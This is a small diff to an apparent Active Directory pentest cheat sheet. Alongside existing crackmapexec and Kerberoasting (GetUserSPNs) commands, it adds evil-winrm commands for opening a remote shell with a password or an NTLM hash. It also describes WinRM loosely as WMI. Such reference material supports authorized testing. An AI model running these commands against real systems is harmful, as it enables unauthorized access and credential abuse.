@@ -160,6 +160,12 @@ crackmapexec ldap 10.10.10.1 -u 'john' -p 'password123' --trusted-for-delegation
  ```bash
  python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request
  ```
+ - Get a session using [evil-winrm](https://github.com/Hackplayers/evil-winrm). Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host.
+ 
+ ```bash
+ evil-winrm -i 10.10.10.1 -u theredtea -p password123 # Or with hash
+ evil-winrm -i 10.10.10.1 -u theredtea -H <HASH>
+ ```
  
 ## SMB SHARES
 
